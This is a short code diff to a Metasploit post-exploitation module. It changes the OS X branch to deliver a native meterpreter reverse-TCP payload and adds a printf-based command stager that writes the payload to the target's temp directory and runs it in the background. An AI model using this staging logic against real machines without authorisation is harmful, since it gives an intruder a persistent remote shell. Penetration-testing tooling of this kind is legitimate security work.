@@ -87,9 +87,10 @@ class MetasploitModule < Msf::Post
       psh_arch = 'x86'
       vprint_status("Platform: Windows")
     when 'osx'
-      platform = 'python'
-      payload_name = 'python/meterpreter/reverse_tcp'
+      platform = 'mettle'
+      payload_name = 'osx/x64/meterpreter_reverse_tcp'
       vprint_status("Platform: OS X")
+      larch = [ARCH_X64]
     when 'solaris'
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
@@ -217,6 +218,14 @@ class MetasploitModule < Msf::Post
     if session.platform == 'windows'
       opts[:decoder] = File.join(Rex::Exploitation::DATA_DIR, "exploits", "cmdstager", 'vbs_b64')
       cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
+    elsif session.platform == 'osx'
+      opts[:background] = true
+      opts[:temp] = cmd_exec('echo $TMPDIR')
+      vprint_status("TEMP DIR: #{opts[:temp]}")
+      opts[:file] = datastore['BOURNE_FILE']
+      cmdstager = Rex::Exploitation::CmdStagerPrintf.new(exe)
+      # Note: if a OS X binary payload is added in the future, use CmdStagerPrintf
+      #       as /bin/sh on OS X doesn't support the -n option on echo
     else
       opts[:background] = true
       opts[:temp] = datastore['BOURNE_PATH']
